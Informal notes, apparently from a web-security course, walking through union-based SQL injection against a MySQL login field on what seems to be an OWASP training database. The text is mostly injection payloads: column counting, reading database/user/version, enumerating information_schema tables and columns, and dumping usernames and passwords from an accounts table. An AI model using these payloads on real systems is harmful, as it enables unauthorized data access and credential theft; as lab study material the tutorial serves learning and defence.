After we have discovered how many collums are there, for example 5.
In order to try to read the collum DB we have to use union and then select the columns.
We will set the input as
admin' union select 1,2,3,4,5#    (this only works with mysql)

another way is to input
order by 5
if the server didnt break so that means there is at least 5 collums

lets assume only 2 3 4 apperaed on screen
And if that worked, this will print our DB names.
Lets try to do the following,
admin' union select 1,database(),user(),version(),5#

Now the database, user, version. should appear for example
db: owasp10
user: root@localhost
version:5.5.51a...

Now lets try to disover the tabels from the:
union select 1,table_name,null,null,5 from information_schema.tables#

So we are basically selecting table name from information schema, information schema is a deafualt 
db created by mysql which contain information on all dbs. If we execute it and it works it will
print all the tables we have access to. Also if we want to filter that we can insert
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'#

For example lets assume we got a table named "accounts" We need to know what columns are in there,
union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'accounts'#

this will select colum_name from the default file information_schema.columns.
Which contains all the columns, where the table is accounts
for example lets assume we got password, username printed
now select whatever was printed from the table for example
union select 1,password,username,null,5 from accounts
